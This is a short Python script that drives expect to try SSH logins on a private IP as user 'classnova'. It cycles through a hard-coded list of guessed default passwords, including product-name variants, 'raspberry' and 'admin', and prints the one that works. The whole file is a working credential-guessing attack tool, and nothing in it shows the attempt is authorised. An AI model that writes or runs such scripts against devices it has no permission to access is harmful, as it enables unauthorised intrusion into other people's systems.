import subprocess
import time
import sys

def try_login(ip, user, password):
    print(f"Trying password: '{password}' ...")
    
    # Create an expect script dynamically
    expect_script = f"""
    set timeout 5
    spawn ssh {user}@{ip}
    expect {{
        "password:" {{
            send "{password}\\r"
            expect {{
                "Permission denied" {{ exit 1 }}
                "TIP" {{ exit 0 }}
                "$ " {{ exit 0 }}
                "# " {{ exit 0 }}
                timeout {{ exit 2 }}
            }}
        }}
        "yes/no" {{
            send "yes\\r"
            exp_continue
        }}
        timeout {{ exit 2 }}
        eof {{ exit 1 }}
    }}
    exit 1
    """
    
    try:
        # Run expect script
        p = subprocess.run(['expect', '-c', expect_script], capture_output=True, text=True)
        
        if p.returncode == 0:
            print(f"SUCCESS! Password is: {password}")
            return True
        else:
            # print(f"Failed output: {p.stdout}") # Debug if needed
            pass
            
    except Exception as e:
        print(f"Error: {e}")
        
    return False

passwords = [
    "classnova",
    "ClassNova",
    "classnova123",
    "classnova@123",
    "raspberry",
    "admin",
    "classnova2025",
    "ClassNova2025"
]

target_ip = "172.18.161.85"
user = "classnova"

print(f"Attempting to login to {user}@{target_ip}")

for pwd in passwords:
    if try_login(target_ip, user, pwd):
        print("\nLogin Successful!")
        print(f"Use this command:\nssh {user}@{target_ip}")
        print(f"Password: {pwd}")
        sys.exit(0)

print("\nAll attempts failed.")
